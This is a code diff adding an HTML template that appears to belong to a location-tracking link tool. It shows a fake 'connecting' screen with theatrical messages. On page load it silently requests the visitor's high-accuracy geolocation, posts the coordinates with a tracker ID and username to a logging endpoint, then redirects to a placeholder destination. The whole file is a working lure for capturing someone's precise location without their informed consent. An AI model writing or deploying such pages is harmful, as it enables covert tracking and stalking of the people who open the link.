@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Initializing connection...</title>
+    <style> body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; } </style>
+</head>
+<body>
+    <p>> Establishing secure connection... Please wait.</p>
+    <p>> Bypassing firewall... done.</p>
+    <p>> Fetching geolocation data...</p>
+
+    <script>
+        const destinationUrl = '{{DESTINATION_URL}}';
+        const trackerId = '{{TRACKER_ID}}';
+        const username = '{{USERNAME}}';
+
+        function redirectToDestination() { window.location.href = destinationUrl; }
+        function sendLocationToServer(position) {
+            const { latitude, longitude } = position.coords;
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude, trackerId, username })
+            }).finally(redirectToDestination);
+        }
+        function handleLocationError(error) { redirectToDestination(); }
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, handleLocationError, {
+                    enableHighAccuracy: true, timeout: 10000, maximumAge: 0
+                });
+            } else { redirectToDestination(); }
+        };
+    </script>
+</body>
+</html>
